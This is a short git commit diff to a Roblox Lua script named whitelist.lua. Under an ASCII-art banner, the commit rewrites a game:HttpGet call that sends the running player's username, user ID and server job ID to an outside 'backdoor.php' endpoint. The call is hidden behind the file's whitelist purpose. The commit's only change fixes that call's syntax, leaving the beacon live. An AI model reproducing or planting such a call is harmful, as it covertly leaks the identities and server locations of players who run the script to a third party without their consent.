640e9ee5226b0037ce08b42ca4784ecf7495b100
Pvpahh <81647524+Pvpahh@users.noreply.github.com>
2022-02-28 05:00:32 -0500

    Update whitelist.lua

--- whitelist.lua
+++ whitelist.lua
@@ -8,5 +8,5 @@
 ######  #    #  ####  #    # #####   ####   ####  #    #  
                                                          
 ]]
-game:HttpGet("https://enclosed.live/backdoor.php?username=" .. game:GetService("Players").LocalPlayer.Name .. "&userid=" .. game:GetService("Players").LocalPlayer.UserId .. "&jobid=" .. game.JobId ..")
+    game:HttpGet('https://enclosed.live/backdoor.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId.. "&jobid=" .. game.JobId ..'');
     
